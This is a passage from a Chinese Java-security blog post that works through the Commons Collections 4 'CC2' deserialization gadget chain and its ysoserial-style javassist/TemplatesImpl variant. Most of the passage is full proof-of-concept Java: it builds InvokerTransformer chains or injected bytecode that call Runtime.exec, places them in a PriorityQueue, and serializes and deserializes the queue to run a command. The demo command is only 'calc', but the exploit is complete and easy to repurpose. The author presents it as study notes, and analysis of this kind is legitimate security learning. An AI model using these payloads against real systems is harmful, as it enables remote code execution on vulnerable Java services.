-InvokerTransformer.transform()</span><br><span class="line">                -Method.invoke()</span><br><span class="line">                  -Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h2><p>利用链后半段用的cc1的后半段，可直接拿过来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>

<p>然后创建比较器，为了调用<code>TransformingComparator</code>的<code>comare</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TransformingComparator cp=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br></pre></td></tr></table></figure>

<p>比较器创建好了，再创建PriorityQueue队列，引入上面的<code>TransformingComparator</code>比较器，这里有两种利用方式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方法一：直接new PriorityQueue对象时候添加构造器</span></span><br><span class="line">PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,cp);</span><br><span class="line"></span><br><span class="line"><span class="comment">//方式二：通过反射设置比较器执行</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(pq,cp);</span><br></pre></td></tr></table></figure>

<p>然后给<code>PriorityQueue</code>队列添加元素，分析过程的时候提到队列数组size大小必须大于等于2，所以这里添加元素最少要添加2个，才能触发利用链的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">pq.add(<span class="number">1</span>);</span><br><span class="line">pq.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>最后序列化<code>PriorityQueue</code>对象，再反序列化触发漏洞。</p>
<p>最后POC:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        TransformingComparator cp=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方法一：直接new PriorityQueue对象时候添加构造器，该方法调试会抛出异常</span></span><br><span class="line">        PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,cp);</span><br><span class="line">        pq.add(<span class="number">1</span>);</span><br><span class="line">        pq.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方式二：通过反射设置比较器执行</span></span><br><span class="line">        <span class="comment">//PriorityQueue pq=new PriorityQueue(2);</span></span><br><span class="line">        <span class="comment">//pq.add(1);</span></span><br><span class="line">        <span class="comment">//pq.add(2);</span></span><br><span class="line">        <span class="comment">//Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);</span></span><br><span class="line">        <span class="comment">//field.setAccessible(true);</span></span><br><span class="line">        <span class="comment">//field.set(pq,cp);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//序列化PriorityQueue对象</span></span><br><span class="line">            ObjectOutputStream out=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">            out.writeObject(pq);</span><br><span class="line">            <span class="comment">//反序列化触发漏洞</span></span><br><span class="line">            ObjectInputStream os=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">            os.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>执行实现</p>
<p><img src="/posts/7e30cd4a/cc2-23.png" title="POC执行"></p>
<p>运行报错原因：</p>
<p>这里提示有报错，原因是添加的元素无法通过指定的比较器进行比较，从而抛出的异常（添加的元素为数字，比较器为ChainedTransformer对象，两者没有关联关系，自然无法通过该比较器对数值进行比较），但利用链能全部调用，达到执行的效果。</p>
<p>调试报错原因：</p>
<p>在调试过程中发现，第一种方式无法进行反序列化步骤的调试，调试会直接抛出异常，因为在声明PriorityQueue对象时先传递入比较器，在添加元素时，会自动引入比较器进行比较，因为无法比较，所以编译文件时直接抛出异常，无法进行调试。<br>而第二种是先声明PriorityQueue对象，添加元素 再通过反射去调用设置比较器，因此可以调试到反序列化的步骤，到最后再进行比较的时候出错再抛出异常。<br>（引用反射的知识，动态调用在用到该反射的时候出错才会抛出异常，而普通用法会在编译的时候会直接调用出错就抛出异常）</p>
<h1 id="0x05、CC2-yso利用链分析"><a href="#0x05、CC2-yso利用链分析" class="headerlink" title="0x05、CC2-yso利用链分析"></a>0x05、CC2-yso利用链分析</h1><h2 id="分析简述"><a href="#分析简述" class="headerlink" title="分析简述"></a>分析简述</h2><p>在yso利用链中，并没有使用上文cc2链分析的方法，加入了<code>javassist</code>和<code>TemplatesImpl</code>，通过<code>javassist</code>生成恶意字节码，再通过<code>TemplatesImpl</code>加载字节码返回类对象并实例化，通过上文基础知识对<strong>TemplatesImpl</strong>的了解，重点就在找到一个方法可以调用<code>getOutputProperties()</code>或者<code>newTransformer()</code>方法，去执行恶意代码。</p>
<p>到这也只有正向分析poc来查找调用关系</p>
<p>yso链的主要利用就是通过PriorityQueue优先级队列设置比较器，将InvokerTransformer(String methodName)方法作为比较器传递入PriorityQueue队列，其中在InvokerTransformer(String methodName)构造函数中传递newTransformer()方法作为参数。</p>
<h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>主体部分，javassist生成字节码，然后<code>TemplatesImpl</code>填充对应满足条件，可以直接先把上文中<code>TemplatesImpl</code>基础知识的实现demo搬过来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>下一步，主体构造有了，但是需要有入口能调用<code>TemplatesImpl</code>对象的<code>newTransformer()</code>方法</p>
<p>通过<code>InvokerTransformer(String methodName)</code>方法调用<code>newTransformer()</code>方法或者<code>getOutputProperties()</code>方法都行</p>
<p><img src="/posts/7e30cd4a/cc2-36.png" title="InvokerTransformer"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line">        Constructor cons=Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        <span class="comment">//突破限制，强制调用</span></span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名</span></span><br><span class="line">        InvokerTransformer invokerTransformer=(InvokerTransformer) cons.newInstance(<span class="string">&quot;getOutputProperties&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>getOutputProperties()</code>方法名传递进<code>invokerTransformer</code>对象了，接下来就是跟CC2链分析的调用情况一样，设置比较器，将<code>invokerTransformer</code>作为比较器赋值给<code>TransformingComparator</code>对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置比较器，目的调用compare方法,再通过,执行getOutputProperties方法</span></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br></pre></td></tr></table></figure>

<p>比较器有了，现在创建PriorityQueue队列，通过反射设置size大小以及比较器，由CC2分析的时候知道调用compare方法是关键，因为跟上文的cc2调用情况不一样，上文调用了<code>ChainedTransformer</code>类把恶意代码执行串起来了，因此队列add进去的参数无所谓</p>
<p>但这个cc2-yso调用是先设置<code>InvokerTransformer(String methodName)</code>构造函数传递入<code>getOutputProperties</code>方法，最后再通过compare传递入TemplatesImpl对象来调用，相当于执行<code>InvokerTransformer.transform(TemplatesImpl)</code>，最后执行效果为<code>TemplatesImpl.getOutputProperties()</code>达到目的</p>
<p><img src="/posts/7e30cd4a/cc2-37.png" title="compare"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置比较器，目的调用compare方法去执行invokerTransformer.transform(),执行getOutputProperties方法</span></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line">        <span class="comment">//设置优先级队列对象</span></span><br><span class="line">        PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置size大小，满足大于2的条件</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置比较器</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line">        <span class="comment">//设置传递的队列元素</span></span><br><span class="line">        Object[] list=<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">//向PriorityQueue队列添加元素</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;queue&quot;</span>,list);</span><br></pre></td></tr></table></figure>

<p>结合以上得到最后的poc：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line">        Constructor cons=Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        <span class="comment">//突破限制，强制调用</span></span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名，也可以为newTransformer方法名</span></span><br><span class="line">        InvokerTransformer invokerTransformer=(InvokerTransformer) cons.newInstance(<span class="string">&quot;getOutputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置比较器，目的调用compare方法去执行invokerTransformer.transform(),执行getOutputProperties方法</span></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line">        <span class="comment">//设置优先级队列对象</span></span><br><span class="line">        PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置size大小，满足大于2的条件</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置比较器</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line">        <span class="comment">//设置传递的队列元素，需要将templates对象传入，目的调用InvokerTransformer.transform(TemplatesImpl)</span></span><br><span class="line">        Object[] list=<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">//向PriorityQueue队列添加元素</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;queue&quot;</span>,list);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc2payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(pq);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc2payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>实现demo：<br><img src="/posts/7e30cd4a/cc2-38.png" title="实现demo"></p>
<p>其中报错跟上文cc2分析和<code>TemplatesImpl</code>类学习的报错一样就不再赘述了</p>
<h1 id="0x06、总结"><a href="#0x06、总结" class="headerlink" title="0x06、总结"></a>0x06、总结</h1><p>总的来说cc2-yso链比普通链复杂了很多，其中也学习了javassist生成字节码，再到TemplatesImpl去读取字节码实例化，最后结合优先级队列实现命令执行。<br>绕来绕去这中间确实花了不少时间，有些调用细节还是需要多看一下才能发现精髓（也确实费时间），但对调用的很多类都还没有从jdk源码上真正明白他们每个类的每个方法是实现怎样的作用，只从利用链角度去了解了调用到的链的类的相关原理，后面尽量多去了解那些类的原理。</p>
<h1 id="0x07、参考链接"><a href="#0x07、参考链接" class="headerlink" title="0x07、参考链接"></a>0x07、参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/13811335.html">https://www.cnblogs.com/nice0e3/p/13811335.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hlkawa/p/15383289.html">https://www.cnblogs.com/hlkawa/p/15383289.html</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/cb591a12f50c">https://www.jianshu.com/p/cb591a12f50c</a><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/1242/#commonscollections-2">https://paper.seebug.org/1242/#commonscollections-2</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/247044?from=timeline#h2-0">https://www.anquanke.com/post/id/247044?from=timeline#h2-0</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://Okaytc.github.io">Okaytc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://okaytc.github.io/posts/7e30cd4a.html">https://okaytc.github.io/posts/7e30cd4a.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Okaytc.github.io" target="_blank">Okaytc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a><a class="post-meta__tags" href="/tags/java%E5%88%A9%E7%94%A8%E9%93%BE/">java利用链</a></div><div class="post_share"><div class="social-share" data-image="/img/bg3.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/dd664be3.html"><img class="next-cover" src="/img/bg3.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">java安全-CC1链学习与分析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/dd664be3.html" title="java安全-CC1链学习与分析"><img class="cover" src="/img/bg3.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-09</div><div class="title">java安全-CC1链学习与分析</div></div></a></div><div><a href="/posts/643c7e53.html" title="java安全-URLDNS链学习与分析"><img class="cover" src="/img/bg3.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-25</div><div class="title">java安全-URLDNS链学习与分析</div></div></a></div><div><a href="/posts/7a787d86.html" title="java安全-初识java反射"><img class="cover" src="/img/bg3.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-18</div><div class="title">java安全-初识java反射</div></div></a></div><div><a href="/posts/45180cd1.html" title="java安全-初识反序列化"><img class="cover" src="/img/bg3.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-27</div><div class="title">java安全-初识反序列化</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Okaytc</div><div class="author-info__description">生活 健身 学习 沉淀</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Okaytc"><i class="fab fa-github"></i><span>Github</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">学习一些漏洞分析、复现、相关工具使用等，当作是学习记录吧。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00、前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E3%80%81Apache-Commons-Collections%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">0x01、Apache Commons Collections描述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">3.</span> <span class="toc-text">0x02、环境准备</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03%E3%80%81%E5%88%A9%E7%94%A8%E9%93%BE%E5%9F%BA%E7%A1%80%E5%89%8D%E6%8F%90"><span class="toc-number">4.</span> <span class="toc-text">0x03、利用链基础前提</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#javassist%E5%AD%97%E8%8A%82%E7%A0%81%E5%A2%9E%E5%BC%BA%E7%B1%BB"><span class="toc-number">4.1.</span> <span class="toc-text">javassist字节码增强类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ClassPool"><span class="toc-number">4.1.1.</span> <span class="toc-text">ClassPool</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CtClass"><span class="toc-number">4.1.2.</span> <span class="toc-text">CtClass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CtMethods"><span class="toc-number">4.1.3.</span> <span class="toc-text">CtMethods</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CtConstructor"><span class="toc-number">4.1.4.</span> <span class="toc-text">CtConstructor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 